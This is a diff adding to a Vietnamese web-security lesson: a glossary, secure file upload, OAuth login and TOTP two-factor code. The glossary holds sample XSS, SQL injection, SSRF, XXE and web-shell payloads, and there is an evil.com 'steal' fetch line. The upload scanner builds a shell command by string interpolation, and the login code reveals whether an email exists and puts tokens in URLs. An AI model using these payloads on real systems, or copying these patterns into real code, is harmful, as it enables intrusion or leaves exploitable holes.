@@ -1,8 +1,5 @@
 # 🔐 Q51: Bảo Mật Security trên Web Application
 
-
-
-
 **❓ Tình Huống:**
 
 Bạn là Senior Frontend Developer phụ trách security cho Trading Platform xử lý:
@@ -1223,3 +1220,1909 @@ setInterval(() => {
 }, 60000); // Mỗi phút
 ```
 
+---
+
+## **📚 GLOSSARY - Giải Thích Các Thuật Ngữ & Viết Tắt**
+
+### **🔤 Các Từ Viết Tắt (Abbreviations)**
+
+| Viết Tắt          | Đầy Đủ                                              | Giải Thích                                                                      | Ví Dụ                                                                           |
+| ----------------- | --------------------------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
+| **XSS**           | Cross-Site Scripting                                | Lỗ hổng cho phép hacker inject JavaScript vào trang web → đánh cắp dữ liệu user | User nhập: `<script>alert('hack')</script>`                                     |
+| **CSRF**          | Cross-Site Request Forgery                          | Tấn công buộc user thực hiện hành động không mong muốn trên site đang login     | User đã login bank.com → click link evil.com → evil.com gửi request chuyển tiền |
+| **SQL Injection** | SQL Code Injection                                  | Inject SQL code vào query → truy cập/xóa database                               | Input: `' OR '1'='1` → bypass login                                             |
+| **HTTPS**         | HTTP Secure                                         | HTTP + TLS encryption → mã hóa dữ liệu giữa browser ↔ server                    | URL bắt đầu với `https://`                                                      |
+| **TLS**           | Transport Layer Security                            | Protocol mã hóa dữ liệu khi truyền qua mạng (thay thế SSL)                      | HTTPS sử dụng TLS 1.3                                                           |
+| **SSL**           | Secure Sockets Layer                                | Protocol mã hóa cũ (đã lỗi thời, thay bằng TLS)                                 | SSL 3.0 có lỗ hổng POODLE                                                       |
+| **HSTS**          | HTTP Strict Transport Security                      | Header bắt buộc browser dùng HTTPS, không cho HTTP                              | `Strict-Transport-Security: max-age=31536000`                                   |
+| **CSP**           | Content Security Policy                             | Header quy định nguồn nào được phép load scripts/styles/images                  | `script-src 'self' https://cdn.com`                                             |
+| **CORS**          | Cross-Origin Resource Sharing                       | Cơ chế cho phép domain khác gọi API của bạn                                     | API cho phép `https://app.com` gọi `https://api.com`                            |
+| **JWT**           | JSON Web Token                                      | Token chứa thông tin user được mã hóa + ký bằng secret key                      | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`                                       |
+| **API**           | Application Programming Interface                   | Giao diện cho phép apps giao tiếp với nhau                                      | REST API: `GET /api/users`                                                      |
+| **DDoS**          | Distributed Denial of Service                       | Tấn công làm quá tải server bằng hàng triệu requests                            | Botnet gửi 10 triệu requests/giây                                               |
+| **MitM**          | Man-in-the-Middle                                   | Hacker chặn giữa browser ↔ server để đọc/sửa dữ liệu                            | Hacker ở quán cafe chặn WiFi public                                             |
+| **2FA/MFA**       | Two-Factor/Multi-Factor Authentication              | Xác thực 2 bước (password + OTP/SMS/app)                                        | Login = password + code từ Google Authenticator                                 |
+| **OTP**           | One-Time Password                                   | Mật khẩu 1 lần, hết hạn sau vài phút                                            | SMS: "Mã xác nhận: 123456 (5 phút)"                                             |
+| **CAPTCHA**       | Completely Automated Public Turing test             | Test phân biệt người vs bot (chọn hình, nhập chữ)                               | "Chọn tất cả ô có đèn giao thông"                                               |
+| **WAF**           | Web Application Firewall                            | Tường lửa bảo vệ web app khỏi attacks (XSS, SQL injection)                      | Cloudflare WAF, AWS WAF                                                         |
+| **SRI**           | Subresource Integrity                               | Verify file từ CDN không bị sửa đổi (hash check)                                | `<script integrity="sha384-abc123...">`                                         |
+| **OAuth**         | Open Authorization                                  | Protocol cho phép app truy cập dữ liệu user mà không cần password               | "Login with Google", "Login with Facebook"                                      |
+| **OIDC**          | OpenID Connect                                      | Layer trên OAuth 2.0 cho authentication                                         | Google Sign-In sử dụng OIDC                                                     |
+| **SAML**          | Security Assertion Markup Language                  | Protocol SSO cho enterprise (XML-based)                                         | Employee login 1 lần → truy cập tất cả apps công ty                             |
+| **SSO**           | Single Sign-On                                      | Login 1 lần → truy cập nhiều apps                                               | Login Google → tự động login YouTube, Gmail, Drive                              |
+| **SSRF**          | Server-Side Request Forgery                         | Trick server gửi request đến internal resources                                 | Exploit: `GET /api/image?url=http://localhost:6379`                             |
+| **XXE**           | XML External Entity                                 | Inject XML entity để đọc files hoặc SSRF                                        | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                     |
+| **RCE**           | Remote Code Execution                               | Chạy code từ xa trên server (rất nguy hiểm!)                                    | Upload shell.php → chạy `system($_GET['cmd'])`                                  |
+| **LFI/RFI**       | Local/Remote File Inclusion                         | Include file không an toàn → RCE                                                | `include($_GET['page'] . '.php')` → LFI                                         |
+| **IDOR**          | Insecure Direct Object Reference                    | Truy cập object của user khác bằng cách thay đổi ID                             | `GET /api/user/123` → thay 123 thành 456                                        |
+| **CDN**           | Content Delivery Network                            | Mạng phân phối nội dung toàn cầu (cache static files)                           | Cloudflare, AWS CloudFront                                                      |
+| **PII**           | Personally Identifiable Information                 | Thông tin cá nhân nhận diện được (email, phone, SSN)                            | Email, số điện thoại, CMND/CCCD                                                 |
+| **GDPR**          | General Data Protection Regulation                  | Luật bảo vệ dữ liệu cá nhân của EU                                              | Right to be forgotten, data portability                                         |
+| **HIPAA**         | Health Insurance Portability and Accountability Act | Luật bảo vệ dữ liệu y tế (US)                                                   | Encrypt patient medical records                                                 |
+| **PCI-DSS**       | Payment Card Industry Data Security Standard        | Chuẩn bảo mật thẻ tín dụng                                                      | Encrypt credit card numbers, no store CVV                                       |
+
+### **🔐 Các Thuật Ngữ Bảo Mật (Security Terms)**
+
+<details>
+<summary><strong>Authentication (Xác Thực)</strong></summary>
+
+**Định nghĩa:** Xác minh danh tính user (bạn là ai?)
+
+**Các phương pháp:**
+
+- **Password**: Cách phổ biến nhất (hash với bcrypt)
+- **2FA/MFA**: Password + OTP/SMS/app
+- **Biometric**: Vân tay, khuôn mặt
+- **OAuth/OIDC**: Login with Google/Facebook
+
+**Ví dụ:**
+
+```typescript
+// Verify user identity
+const user = await User.findOne({ email });
+const valid = await bcrypt.compare(password, user.passwordHash);
+if (!valid) throw new Error('Sai mật khẩu');
+```
+
+</details>
+
+<details>
+<summary><strong>Authorization (Phân Quyền)</strong></summary>
+
+**Định nghĩa:** Kiểm tra quyền truy cập (bạn được làm gì?)
+
+**Các mô hình:**
+
+- **RBAC** (Role-Based Access Control): Phân quyền theo role (admin, user, guest)
+- **ABAC** (Attribute-Based Access Control): Phân quyền theo attributes
+- **ACL** (Access Control List): Danh sách quyền cho từng resource
+
+**Ví dụ:**
+
+```typescript
+// Check user permission
+const checkPermission = (user, action) => {
+  if (user.role === 'admin') return true;
+  if (user.role === 'user' && action === 'read') return true;
+  return false;
+};
+```
+
+</details>
+
+<details>
+<summary><strong>Encryption (Mã Hóa)</strong></summary>
+
+**Định nghĩa:** Chuyển plaintext → ciphertext (có thể giải mã)
+
+**Các loại:**
+
+- **Symmetric**: Cùng 1 key (AES-256)
+- **Asymmetric**: 2 keys - public + private (RSA)
+
+**Ví dụ:**
+
+```typescript
+// AES-256-GCM encryption
+const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+let encrypted = cipher.update(plaintext, 'utf8', 'hex');
+encrypted += cipher.final('hex');
+```
+
+</details>
+
+<details>
+<summary><strong>Hashing (Băm)</strong></summary>
+
+**Định nghĩa:** Chuyển input → fixed-length output (KHÔNG thể giải mã)
+
+**Use cases:**
+
+- **Password storage**: bcrypt, argon2
+- **Data integrity**: SHA-256, SHA-512
+- **Search encrypted fields**: SHA-256 hash index
+
+**Ví dụ:**
+
+```typescript
+// Hash password (one-way)
+const hash = await bcrypt.hash(password, 10);
+// KHÔNG thể: const password = bcrypt.decrypt(hash); ❌
+```
+
+</details>
+
+<details>
+<summary><strong>Salt (Muối)</strong></summary>
+
+**Định nghĩa:** Random string thêm vào password trước khi hash
+
+**Tại sao cần?** Chống rainbow table attack (precomputed hash dictionary)
+
+**Ví dụ:**
+
+```typescript
+// Password: "123456"
+// Hash without salt: "e10adc3949ba59abbe56e057f20f883e" (giống nhau cho tất cả user)
+// Hash with salt: mỗi user có hash khác nhau (vì salt random)
+
+const salt = await bcrypt.genSalt(10); // Generate random salt
+const hash = await bcrypt.hash(password, salt); // "123456" + salt → unique hash
+```
+
+</details>
+
+<details>
+<summary><strong>Token</strong></summary>
+
+**Định nghĩa:** Chuỗi ký tự đại diện cho session/authentication
+
+**Các loại:**
+
+- **Access Token**: Ngắn hạn (15 phút), dùng để gọi API
+- **Refresh Token**: Dài hạn (7 ngày), dùng để lấy access token mới
+- **CSRF Token**: Chống CSRF attack
+- **API Key**: Xác thực app/service
+
+**Ví dụ:**
+
+```typescript
+// JWT Token structure
+{
+  "header": { "alg": "HS256", "typ": "JWT" },
+  "payload": { "userId": "123", "email": "user@example.com", "exp": 1234567890 },
+  "signature": "abc123..."
+}
+```
+
+</details>
+
+<details>
+<summary><strong>Cookie</strong></summary>
+
+**Định nghĩa:** Data lưu ở browser, tự động gửi kèm mỗi request
+
+**Attributes:**
+
+- **httpOnly**: JavaScript không đọc được (chống XSS)
+- **secure**: Chỉ gửi qua HTTPS
+- **sameSite**: Chống CSRF (strict/lax/none)
+- **maxAge**: Thời gian sống (seconds)
+
+**Ví dụ:**
+
+```typescript
+res.cookie('refreshToken', token, {
+  httpOnly: true, // XSS không steal được
+  secure: true, // Chỉ HTTPS
+  sameSite: 'strict', // Chống CSRF
+  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
+});
+```
+
+</details>
+
+<details>
+<summary><strong>Same-Origin Policy (SOP)</strong></summary>
+
+**Định nghĩa:** Browser chỉ cho phép JavaScript từ origin A đọc dữ liệu từ origin A
+
+**Origin = Protocol + Domain + Port**
+
+- `https://example.com:443` ≠ `http://example.com:80` (khác protocol)
+- `https://example.com` ≠ `https://api.example.com` (khác subdomain)
+
+**Tại sao quan trọng?** Ngăn evil.com đọc dữ liệu từ bank.com
+
+**Ví dụ:**
+
+```javascript
+// Ở trang https://bank.com
+fetch('https://api.bank.com/balance'); // ✅ Same origin
+fetch('https://evil.com/steal'); // ❌ Blocked by SOP
+
+// Nếu không có SOP:
+// evil.com có thể: fetch('https://bank.com/transfer?to=hacker&amount=1000000')
+// → Steal tiền (vì browser tự động gửi cookies)
+```
+
+</details>
+
+---
+
+## **🔐 8️⃣ ADDITIONAL SECURITY TOPICS - Các Chủ Đề Bảo Mật Bổ Sung**
+
+### **📁 8.1. FILE UPLOAD SECURITY - Bảo Mật Upload File**
+
+**⚠️ Vấn Đề:** File upload là vector tấn công phổ biến
+
+**Threats:**
+
+- Upload shell.php → RCE (Remote Code Execution)
+- Upload virus/malware
+- Upload file quá lớn → DoS
+- Path traversal: `../../etc/passwd`
+
+```typescript
+// =====================================
+// FILE UPLOAD SECURITY IMPLEMENTATION
+// =====================================
+
+import multer from 'multer';
+import path from 'path';
+import crypto from 'crypto';
+import { promisify } from 'util';
+import { exec } from 'child_process';
+
+const execAsync = promisify(exec);
+
+// 🛡️ A. Validate File Type (MIME Type + Extension)
+const ALLOWED_MIME_TYPES = [
+  'image/jpeg',
+  'image/png',
+  'image/gif',
+  'application/pdf',
+];
+
+const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
+
+const validateFileType = (file: Express.Multer.File): boolean => {
+  // ✅ Check 1: MIME type
+  if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
+    return false;
+  }
+
+  // ✅ Check 2: File extension
+  const ext = path.extname(file.originalname).toLowerCase();
+  if (!ALLOWED_EXTENSIONS.includes(ext)) {
+    return false;
+  }
+
+  // ✅ Check 3: Magic number (file signature)
+  // Đọc bytes đầu file để verify thật sự là image
+  // VD: JPEG bắt đầu với FF D8 FF, PNG với 89 50 4E 47
+  const buffer = file.buffer.slice(0, 4);
+  const magicNumber = buffer.toString('hex');
+
+  const validSignatures: Record<string, string[]> = {
+    'image/jpeg': ['ffd8ffe0', 'ffd8ffe1', 'ffd8ffdb'],
+    'image/png': ['89504e47'],
+    'image/gif': ['47494638'],
+  };
+
+  const signatures = validSignatures[file.mimetype];
+  if (signatures && !signatures.some((sig) => magicNumber.startsWith(sig))) {
+    return false;
+  }
+
+  return true;
+};
+
+// 🛡️ B. Sanitize Filename (Chống Path Traversal)
+const sanitizeFilename = (filename: string): string => {
+  // ❌ Filename nguy hiểm: "../../etc/passwd"
+  // ❌ Filename nguy hiểm: "shell.php.jpg" (double extension)
+
+  // ✅ Bước 1: Generate random filename (không dùng filename gốc)
+  const ext = path.extname(filename).toLowerCase();
+  const randomName = crypto.randomBytes(16).toString('hex');
+  const safeFilename = `${randomName}${ext}`;
+
+  // ✅ Bước 2: Remove path separators (/, \)
+  return safeFilename.replace(/[\/\\]/g, '');
+};
+
+// 🛡️ C. Limit File Size
+const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
+
+const upload = multer({
+  storage: multer.memoryStorage(), // Lưu trong memory để validate trước
+  limits: {
+    fileSize: MAX_FILE_SIZE, // Giới hạn 5MB
+    files: 5, // Tối đa 5 files cùng lúc
+  },
+  fileFilter: (req, file, cb) => {
+    // Validate file type trước khi upload
+    if (!validateFileType(file)) {
+      cb(new Error('File type not allowed'), false);
+    } else {
+      cb(null, true);
+    }
+  },
+});
+
+// 🛡️ D. Scan for Malware (ClamAV)
+async function scanFileForVirus(filePath: string): Promise<boolean> {
+  try {
+    // ClamAV: Open-source antivirus
+    const { stdout } = await execAsync(`clamscan --no-summary ${filePath}`);
+
+    if (stdout.includes('FOUND')) {
+      console.log('⚠️ Virus detected:', stdout);
+      return false; // Virus found
+    }
+
+    return true; // Clean file
+  } catch (error) {
+    console.error('Virus scan failed:', error);
+    return false; // Assume unsafe nếu scan fail
+  }
+}
+
+// 🛡️ E. Store Outside Web Root
+// ❌ BAD: Lưu trong public folder → user truy cập trực tiếp
+// /public/uploads/shell.php → http://example.com/uploads/shell.php (RCE!)
+
+// ✅ GOOD: Lưu ngoài web root
+const UPLOAD_DIR = '/var/uploads'; // Ngoài /var/www/html (web root)
+
+// Serve files qua API với authentication
+app.get('/api/files/:fileId', authenticateToken, async (req, res) => {
+  const fileId = req.params.fileId;
+
+  // Get file metadata from database
+  const file = await db.files.findOne({ id: fileId, userId: req.user.id });
+
+  if (!file) {
+    return res.status(404).json({ error: 'File not found' });
+  }
+
+  // ✅ Check user permission
+  if (file.userId !== req.user.id && !req.user.isAdmin) {
+    return res.status(403).json({ error: 'Access denied' });
+  }
+
+  // Serve file
+  const filePath = path.join(UPLOAD_DIR, file.filename);
+  res.download(filePath, file.originalName);
+});
+
+// 🛡️ F. Complete Upload Handler
+app.post(
+  '/api/upload',
+  authenticateToken,
+  upload.single('file'),
+  async (req, res) => {
+    try {
+      const file = req.file;
+
+      if (!file) {
+        return res.status(400).json({ error: 'No file uploaded' });
+      }
+
+      // ✅ Validate file type
+      if (!validateFileType(file)) {
+        return res.status(400).json({ error: 'Invalid file type' });
+      }
+
+      // ✅ Sanitize filename
+      const safeFilename = sanitizeFilename(file.originalname);
+
+      // ✅ Save file to disk (outside web root)
+      const filePath = path.join(UPLOAD_DIR, safeFilename);
+      await fs.promises.writeFile(filePath, file.buffer);
+
+      // ✅ Scan for virus
+      const isClean = await scanFileForVirus(filePath);
+      if (!isClean) {
+        // Delete file ngay lập tức
+        await fs.promises.unlink(filePath);
+        return res.status(400).json({ error: 'File contains malware' });
+      }
+
+      // ✅ Save metadata to database
+      const fileRecord = await db.files.create({
+        id: crypto.randomUUID(),
+        userId: req.user.id,
+        originalName: file.originalname,
+        filename: safeFilename,
+        mimetype: file.mimetype,
+        size: file.size,
+        uploadedAt: new Date(),
+      });
+
+      res.json({
+        success: true,
+        file: {
+          id: fileRecord.id,
+          name: fileRecord.originalName,
+          size: fileRecord.size,
+          url: `/api/files/${fileRecord.id}`,
+        },
+      });
+    } catch (error) {
+      console.error('Upload error:', error);
+      res.status(500).json({ error: 'Upload failed' });
+    }
+  }
+);
+
+// 📋 FILE UPLOAD SECURITY CHECKLIST
+/*
+✅ Validate MIME type + extension + magic number
+✅ Sanitize filename (không dùng filename gốc)
+✅ Limit file size
+✅ Scan for malware
+✅ Store outside web root
+✅ Serve files via API với authentication
+✅ Set correct Content-Type khi serve
+✅ Implement rate limiting (chống spam upload)
+✅ Log upload events
+✅ Backup uploaded files
+*/
+```
+
+---
+
+### **👤 8.2. OAUTH 2.0 & OPENID CONNECT - Login with Social**
+
+**📌 Tình huống:** Implement "Login with Google", "Login with Facebook"
+
+**Giải thích:**
+
+- **OAuth 2.0**: Protocol cho phép app truy cập dữ liệu user mà không cần password
+- **OpenID Connect (OIDC)**: Layer trên OAuth 2.0 để authentication
+
+```typescript
+// =====================================
+// OAUTH 2.0 + OIDC IMPLEMENTATION
+// =====================================
+
+import { Strategy as GoogleStrategy } from 'passport-google-oauth20';
+import passport from 'passport';
+
+// 🔐 A. Google OAuth Strategy
+passport.use(
+  new GoogleStrategy(
+    {
+      clientID: process.env.GOOGLE_CLIENT_ID!,
+      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
+      callbackURL: 'https://yourapp.com/auth/google/callback',
+    },
+    async (accessToken, refreshToken, profile, done) => {
+      try {
+        // ✅ Check if user exists
+        let user = await db.users.findOne({ googleId: profile.id });
+
+        if (!user) {
+          // ✅ Create new user
+          user = await db.users.create({
+            googleId: profile.id,
+            email: profile.emails[0].value,
+            name: profile.displayName,
+            avatar: profile.photos[0].value,
+            provider: 'google',
+            createdAt: new Date(),
+          });
+        }
+
+        // ✅ Return user
+        done(null, user);
+      } catch (error) {
+        done(error, null);
+      }
+    }
+  )
+);
+
+// 🔐 B. OAuth Routes
+// Step 1: Redirect to Google login page
+app.get(
+  '/auth/google',
+  passport.authenticate('google', {
+    scope: ['profile', 'email'], // Request permissions
+  })
+);
+
+// Step 2: Google callback (user login thành công)
+app.get(
+  '/auth/google/callback',
+  passport.authenticate('google', { failureRedirect: '/login' }),
+  (req, res) => {
+    // ✅ Generate JWT tokens
+    const accessToken = jwt.sign(
+      { userId: req.user.id, email: req.user.email },
+      process.env.JWT_SECRET!,
+      { expiresIn: '15m' }
+    );
+
+    const refreshToken = jwt.sign(
+      { userId: req.user.id },
+      process.env.REFRESH_TOKEN_SECRET!,
+      { expiresIn: '7d' }
+    );
+
+    // ✅ Set refresh token in httpOnly cookie
+    res.cookie('refreshToken', refreshToken, {
+      httpOnly: true,
+      secure: true,
+      sameSite: 'strict',
+      maxAge: 7 * 24 * 60 * 60 * 1000,
+    });
+
+    // ✅ Redirect to frontend với access token
+    res.redirect(`https://yourapp.com/auth/callback?token=${accessToken}`);
+  }
+);
+
+// 🔐 C. Frontend Implementation (React)
+function LoginPage() {
+  const handleGoogleLogin = () => {
+    // Redirect to backend OAuth route
+    window.location.href = 'https://api.yourapp.com/auth/google';
+  };
+
+  return (
+    <div>
+      <h2>Login</h2>
+      <button onClick={handleGoogleLogin}>🔑 Login with Google</button>
+    </div>
+  );
+}
+
+// Callback handler (nhận token từ backend)
+function AuthCallback() {
+  useEffect(() => {
+    // Extract token from URL
+    const params = new URLSearchParams(window.location.search);
+    const token = params.get('token');
+
+    if (token) {
+      // ✅ Store access token in memory (Context/Zustand)
+      authStore.setAccessToken(token);
+
+      // ✅ Redirect to dashboard
+      navigate('/dashboard');
+    }
+  }, []);
+
+  return <div>Đang xử lý login...</div>;
+}
+
+// 📊 OAUTH FLOW DIAGRAM
+/*
+┌──────────┐                                     ┌─────────────┐
+│  User    │                                     │   Google    │
+└────┬─────┘                                     └──────┬──────┘
+     │                                                  │
+     │  1. Click "Login with Google"                   │
+     ├──────────────────────────────────────────►      │
+     │                                                  │
+     │  2. Redirect to Google login                    │
+     │  ◄──────────────────────────────────────────────┤
+     │                                                  │
+     │  3. User login + approve permissions            │
+     ├──────────────────────────────────────────►      │
+     │                                                  │
+     │  4. Google redirects to callback + auth code    │
+     │  ◄──────────────────────────────────────────────┤
+     │                                                  │
+┌────▼─────┐                                     ┌──────▼──────┐
+│ Backend  │  5. Exchange code for tokens        │   Google    │
+└────┬─────┘  ────────────────────────────────►  └──────┬──────┘
+     │                                                   │
+     │        6. Return user profile + tokens           │
+     │   ◄───────────────────────────────────────────────┤
+     │                                                   │
+     │  7. Create/find user in DB                       │
+     │  8. Generate JWT tokens                          │
+     │  9. Set refresh token cookie                     │
+     │  10. Redirect to frontend với access token       │
+     │                                                   │
+┌────▼─────┐                                            │
+│ Frontend │  11. Store token + redirect to dashboard  │
+└──────────┘                                            │
+*/
+
+// 🔐 D. Security Best Practices for OAuth
+
+// ✅ 1. Validate state parameter (chống CSRF)
+app.get('/auth/google', (req, res, next) => {
+  const state = crypto.randomBytes(16).toString('hex');
+
+  // Save state in session
+  req.session.oauthState = state;
+
+  passport.authenticate('google', {
+    scope: ['profile', 'email'],
+    state, // Pass state to Google
+  })(req, res, next);
+});
+
+app.get('/auth/google/callback', (req, res, next) => {
+  const state = req.query.state;
+
+  // ✅ Verify state matches
+  if (state !== req.session.oauthState) {
+    return res.status(403).json({ error: 'Invalid state parameter' });
+  }
+
+  // Clear state
+  delete req.session.oauthState;
+
+  passport.authenticate('google')(req, res, next);
+});
+
+// ✅ 2. Use PKCE (Proof Key for Code Exchange) - for SPAs
+// PKCE adds extra security layer for public clients (mobile apps, SPAs)
+
+// ✅ 3. Limit scope (chỉ request permissions cần thiết)
+// ❌ BAD: scope: ['profile', 'email', 'drive', 'calendar', 'contacts']
+// ✅ GOOD: scope: ['profile', 'email']
+
+// ✅ 4. Validate email verified
+passport.use(
+  new GoogleStrategy(
+    {
+      // ...
+    },
+    async (accessToken, refreshToken, profile, done) => {
+      // ✅ Check if email is verified
+      const email = profile.emails[0];
+      if (!email.verified) {
+        return done(new Error('Email not verified'), null);
+      }
+
+      // ...
+    }
+  )
+);
+```
+
+---
+
+### **🔒 8.3. TWO-FACTOR AUTHENTICATION (2FA) - Xác Thực 2 Bước**
+
+**📌 Tại sao cần 2FA?**
+
+- Password có thể bị đoán/leak
+- 2FA thêm 1 layer bảo mật: **Something you know (password) + Something you have (phone/app)**
+
+```typescript
+// =====================================
+// 2FA IMPLEMENTATION với TOTP (Time-based OTP)
+// =====================================
+
+import speakeasy from 'speakeasy';
+import QRCode from 'qrcode';
+
+// 🔐 A. Enable 2FA - Generate Secret
+app.post('/api/2fa/enable', authenticateToken, async (req, res) => {
+  const user = await db.users.findById(req.user.id);
+
+  if (user.twoFactorEnabled) {
+    return res.status(400).json({ error: '2FA đã được kích hoạt' });
+  }
+
+  // ✅ Generate secret key
+  const secret = speakeasy.generateSecret({
+    name: `YourApp (${user.email})`, // Hiển thị trong Authenticator app
+    issuer: 'YourApp',
+  });
+
+  // ✅ Save secret (chưa enable, đợi user verify)
+  await db.users.update(req.user.id, {
+    twoFactorSecret: secret.base32, // Lưu secret (mã hóa trước!)
+    twoFactorEnabled: false, // Chưa enable
+  });
+
+  // ✅ Generate QR code để user scan
+  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
+
+  res.json({
+    secret: secret.base32, // User có thể nhập manual
+    qrCode: qrCodeUrl, // Hoặc scan QR code
+  });
+});
+
+// 🔐 B. Verify 2FA Code và Enable
+app.post('/api/2fa/verify', authenticateToken, async (req, res) => {
+  const { code } = req.body;
+
+  const user = await db.users.findById(req.user.id);
+
+  // ✅ Verify TOTP code
+  const verified = speakeasy.totp.verify({
+    secret: user.twoFactorSecret,
+    encoding: 'base32',
+    token: code,
+    window: 2, // Cho phép ±2 time windows (60 seconds)
+  });
+
+  if (!verified) {
+    return res.status(400).json({ error: 'Mã xác thực không đúng' });
+  }
+
+  // ✅ Enable 2FA
+  await db.users.update(req.user.id, {
+    twoFactorEnabled: true,
+  });
+
+  // ✅ Generate backup codes (để recover khi mất phone)
+  const backupCodes = Array.from({ length: 10 }, () =>
+    crypto.randomBytes(4).toString('hex').toUpperCase()
+  );
+
+  // Save hashed backup codes
+  await db.users.update(req.user.id, {
+    backupCodes: backupCodes.map((code) => bcrypt.hashSync(code, 10)),
+  });
+
+  res.json({
+    success: true,
+    message: '2FA đã được kích hoạt',
+    backupCodes, // Show once, user phải lưu lại
+  });
+});
+
+// 🔐 C. Login with 2FA
+app.post('/api/login', async (req, res) => {
+  const { email, password, twoFactorCode } = req.body;
+
+  // ✅ Step 1: Verify password
+  const user = await db.users.findOne({ email });
+  if (!user) {
+    return res.status(401).json({ error: 'Email không tồn tại' });
+  }
+
+  const validPassword = await bcrypt.compare(password, user.passwordHash);
+  if (!validPassword) {
+    return res.status(401).json({ error: 'Mật khẩu không đúng' });
+  }
+
+  // ✅ Step 2: Check if 2FA enabled
+  if (user.twoFactorEnabled) {
+    if (!twoFactorCode) {
+      // Yêu cầu user nhập 2FA code
+      return res.status(403).json({
+        error: '2FA_REQUIRED',
+        message: 'Vui lòng nhập mã xác thực 2FA',
+      });
+    }
+
+    // ✅ Verify 2FA code
+    const verified = speakeasy.totp.verify({
+      secret: user.twoFactorSecret,
+      encoding: 'base32',
+      token: twoFactorCode,
+      window: 2,
+    });
+
+    if (!verified) {
+      // ❌ 2FA code sai
+      return res.status(401).json({ error: 'Mã xác thực không đúng' });
+    }
+  }
+
+  // ✅ Step 3: Generate JWT tokens
+  const accessToken = jwt.sign(
+    { userId: user.id, email: user.email },
+    process.env.JWT_SECRET!,
+    { expiresIn: '15m' }
+  );
+
+  const refreshToken = jwt.sign(
+    { userId: user.id },
+    process.env.REFRESH_TOKEN_SECRET!,
+    { expiresIn: '7d' }
+  );
+
+  res.cookie('refreshToken', refreshToken, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 7 * 24 * 60 * 60 * 1000,
+  });
+
+  res.json({ accessToken });
+});
+
+// 🔐 D. Backup Code Login (khi mất phone)
+app.post('/api/login/backup-code', async (req, res) => {
+  const { email, password, backupCode } = req.body;
+
+  const user = await db.users.findOne({ email });
+
+  // Verify password...
+
+  // ✅ Check backup code
+  const validBackupCode = user.backupCodes.some((hashedCode) =>
+    bcrypt.compareSync(backupCode, hashedCode)
+  );
+
+  if (!validBackupCode) {
+    return res.status(401).json({ error: 'Backup code không hợp lệ' });
+  }
+
+  // ✅ Remove used backup code
+  await db.users.update(user.id, {
+    backupCodes: user.backupCodes.filter(
+      (hashedCode) => !bcrypt.compareSync(backupCode, hashedCode)
+    ),
+  });
+
+  // Generate tokens...
+  res.json({ accessToken, message: 'Login thành công với backup code' });
+});
+
+// 🔐 E. Frontend Implementation
+function TwoFactorSetup() {
+  const [qrCode, setQrCode] = useState('');
+  const [secret, setSecret] = useState('');
+  const [verificationCode, setVerificationCode] = useState('');
+  const [backupCodes, setBackupCodes] = useState<string[]>([]);
+  const [step, setStep] = useState<'enable' | 'verify' | 'complete'>('enable');
+
+  const handleEnable2FA = async () => {
+    const res = await fetch('/api/2fa/enable', {
+      method: 'POST',
+      headers: { Authorization: `Bearer ${accessToken}` },
+    });
+
+    const data = await res.json();
+    setQrCode(data.qrCode);
+    setSecret(data.secret);
+    setStep('verify');
+  };
+
+  const handleVerify = async () => {
+    const res = await fetch('/api/2fa/verify', {
+      method: 'POST',
+      headers: {
+        Authorization: `Bearer ${accessToken}`,
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ code: verificationCode }),
+    });
+
+    const data = await res.json();
+    if (data.success) {
+      setBackupCodes(data.backupCodes);
+      setStep('complete');
+    }
+  };
+
+  return (
+    <div>
+      {step === 'enable' && (
+        <button onClick={handleEnable2FA}>Kích hoạt 2FA</button>
+      )}
+
+      {step === 'verify' && (
+        <div>
+          <h3>Scan QR Code với Google Authenticator</h3>
+          <img src={qrCode} alt="QR Code" />
+          <p>Hoặc nhập manual: {secret}</p>
+
+          <input
+            type="text"
+            placeholder="Nhập mã 6 số"
+            value={verificationCode}
+            onChange={(e) => setVerificationCode(e.target.value)}
+          />
+          <button onClick={handleVerify}>Xác nhận</button>
+        </div>
+      )}
+
+      {step === 'complete' && (
+        <div>
+          <h3>✅ 2FA đã được kích hoạt!</h3>
+          <h4>Backup Codes (lưu lại an toàn):</h4>
+          <ul>
+            {backupCodes.map((code) => (
+              <li key={code}>{code}</li>
+            ))}
+          </ul>
+          <p>⚠️ Mỗi backup code chỉ dùng được 1 lần</p>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// Login với 2FA
+function LoginForm() {
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [twoFactorCode, setTwoFactorCode] = useState('');
+  const [require2FA, setRequire2FA] = useState(false);
+
+  const handleLogin = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    const res = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password, twoFactorCode }),
+    });
+
+    const data = await res.json();
+
+    if (data.error === '2FA_REQUIRED') {
+      setRequire2FA(true);
+      return;
+    }
+
+    if (data.accessToken) {
+      // Login thành công
+      authStore.setAccessToken(data.accessToken);
+      navigate('/dashboard');
+    }
+  };
+
+  return (
+    <form onSubmit={handleLogin}>
+      <input
+        type="email"
+        placeholder="Email"
+        value={email}
+        onChange={(e) => setEmail(e.target.value)}
+      />
+      <input
+        type="password"
+        placeholder="Password"
+        value={password}
+        onChange={(e) => setPassword(e.target.value)}
+      />
+
+      {require2FA && (
+        <input
+          type="text"
+          placeholder="Mã xác thực 6 số"
+          value={twoFactorCode}
+          onChange={(e) => setTwoFactorCode(e.target.value)}
+          maxLength={6}
+        />
+      )}
+
+      <button type="submit">Login</button>
+    </form>
+  );
+}
+
+// 📊 2FA BEST PRACTICES
+/*
+✅ Use TOTP (Time-based OTP) với Google Authenticator / Authy
+✅ Provide backup codes (10 codes, single-use)
+✅ Allow disabling 2FA (với password + backup code)
+✅ Log 2FA events (enable, disable, failed attempts)
